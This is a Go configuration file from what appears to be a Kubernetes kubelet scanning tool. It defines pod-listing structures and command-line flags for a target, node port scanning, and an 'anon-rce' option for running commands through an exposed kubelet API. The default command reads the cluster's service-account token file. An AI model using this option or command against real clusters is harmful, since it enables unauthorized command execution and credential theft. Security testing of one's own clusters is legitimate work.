package utils

import "github.com/pborman/getopt/v2"

type RunningPods struct {
	Kind       string `json:"kind"`
	APIVersion string `json:"apiVersion"`
	Metadata   struct {
	} `json:"metadata"`
	Items []struct {
		Metadata struct {
			Name              string      `json:"name"`
			Namespace         string      `json:"namespace"`
			UID               string      `json:"uid"`
			CreationTimestamp interface{} `json:"creationTimestamp"`
		} `json:"metadata"`
		Spec struct {
			Containers []struct {
				Name      string `json:"name"`
				Image     string `json:"image"`
				Resources struct {
				} `json:"resources"`
			} `json:"containers"`
		} `json:"spec"`
		Status struct {
		} `json:"status"`
	} `json:"items"`
}

var Target string
var AnonRce = false
var RceCommand = "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
var ScanNode = false

func Config() {

	getopt.FlagLong(&Target, "target", 't', "Target (IP or domain)").Mandatory()
	getopt.FlagLong(&ScanNode, "node-scan", 0, "Enable/disable node port scan").SetOptional()
	getopt.FlagLong(&AnonRce, "anon-rce", 0, "Try to RCE if kubelet API is open").SetOptional()
	getopt.Flag(&RceCommand, 'x', "Command to execute when using RCE")
	getopt.Parse()
}
